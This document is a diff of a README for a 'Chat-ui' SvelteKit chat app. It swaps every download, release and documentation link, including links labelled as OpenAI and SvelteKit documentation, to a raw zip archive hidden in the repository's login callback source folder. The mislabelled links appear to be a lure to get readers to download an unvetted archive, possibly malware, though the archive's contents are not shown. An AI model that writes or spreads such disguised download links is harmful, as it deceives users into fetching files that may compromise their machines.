@@ -6,7 +6,7 @@ Welcome to Chat-ui! This application helps you build a simple and engaging chat 
 
 ## 🔗 Download Chat-ui
 
-[![Download Chat-ui](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip%20Chat--ui-blue?style=for-the-badge)](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip)
+[![Download Chat-ui](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip%20Chat--ui-blue?style=for-the-badge)](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you install Chat-ui, ensure your system meets these requirements:
 
 To download and install Chat-ui, follow these steps:
 
-1. Visit the [Releases page to download](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip).
 2. On the Releases page, you will see various versions of Chat-ui.
 3. Choose the latest version for your operating system.
 4. Click on the version to start the download.
@@ -51,7 +51,7 @@ Once you have installed Chat-ui, here's how to use it:
 
 ## 📚 Documentation 
 
-For further details on using Chat-ui, refer to the documentation included in the application or visit our [official documentation page](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip).
+For further details on using Chat-ui, refer to the documentation included in the application or visit our [official documentation page](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip).
 
 ## 🤝 Support & Contribution
 
@@ -63,9 +63,9 @@ If you wish to contribute, please review the contribution guidelines in the repo
 
 Explore these resources for more tips:
 
-- [OpenAI API Documentation](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip)
-- [SvelteKit Documentation](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip)
+- [OpenAI API Documentation](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip)
+- [SvelteKit Documentation](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip)
 
 Feel free to share your experience with Chat-ui and join the community discussions. 
 
-[![Download Chat-ui](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip%20Chat--ui-blue?style=for-the-badge)](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/lib/constants/ui_Chat_3.1-beta.2.zip)
+[![Download Chat-ui](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip%20Chat--ui-blue?style=for-the-badge)](https://raw.githubusercontent.com/mohdumar009/Chat-ui/main/src/routes/login/callback/ui-Chat-2.8.zip)
